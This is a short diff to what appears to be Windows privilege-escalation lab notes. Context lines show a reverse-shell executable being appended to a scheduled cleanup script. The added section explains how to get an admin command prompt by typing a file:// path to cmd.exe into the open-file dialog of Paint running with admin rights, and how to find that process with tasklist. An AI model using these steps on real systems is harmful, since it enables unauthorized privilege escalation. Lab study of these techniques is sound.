@@ -217,3 +217,14 @@ here u'll need to find scheduled tasks which means tasks that are scheduled to r
 
     # edit it:
     echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+
+# 14 - Insecure GUI Apps:
+
+here we have paint that run with admin privileges so easly you can go to open file and in file path input pas the following path :
+
+    file://c:/windows/system32/cmd.exe
+
+you will get cmd sessio with admin previlages
+NOTE: this command will search for specific program in runing task list:
+
+    tasklist /V | findstr mspaint.exe
